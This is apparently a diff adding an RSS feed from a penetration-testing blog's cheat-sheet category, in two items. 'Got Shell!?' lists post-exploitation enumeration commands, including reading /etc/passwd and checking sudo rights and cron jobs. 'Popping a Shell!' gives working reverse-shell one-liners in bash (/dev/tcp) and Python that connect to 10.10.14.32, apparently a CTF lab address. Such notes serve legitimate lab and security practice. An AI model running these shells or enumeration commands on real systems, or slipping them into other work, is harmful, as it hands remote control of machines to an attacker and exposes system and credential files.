@@ -1,0 +1,18 @@
+<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title>cheat-sheets - Category - Masoopy</title><link>https://www.masoopy.com/categories/cheat-sheets/</link><description>cheat-sheets - Category - Masoopy</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Wed, 10 Feb 2021 17:23:05 +0100</lastBuildDate><atom:link href="https://www.masoopy.com/categories/cheat-sheets/" rel="self" type="application/rss+xml"/><item><title>Got Shell!?</title><link>https://www.masoopy.com/pages/got-shell/</link><pubDate>Wed, 10 Feb 2021 17:23:05 +0100</pubDate><author>Author</author><guid>https://www.masoopy.com/pages/got-shell/</guid><description>What to do when you have a shell?
+Linux history
+whoami
+uname -a
+cat /etc/issue
+cat /etc/passwd
+sudo -l
+crontab -l
+ls -lhtrR /etc/cron*
+ls -lhtrR /home
+Windows set
+getuid
+ipconfig /all
+arp -a
+netstat -ano</description></item><item><title>Popping a Shell!</title><link>https://www.masoopy.com/pages/popping-a-shell/</link><pubDate>Wed, 10 Feb 2021 17:23:05 +0100</pubDate><author>Author</author><guid>https://www.masoopy.com/pages/popping-a-shell/</guid><description><![CDATA[A few ways to pop a shell&hellip;
+/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.32/1234 0&gt;&amp;1'
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.32&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'
+import socket,subprocess,os s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) s.connect((&#34;10.10.14.32&#34;,1235)) os.dup2(s.fileno(),0) os.dup2(s.fileno(),1) os.dup2(s.fileno(),2) p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]) ]]></description></item></channel></rss>
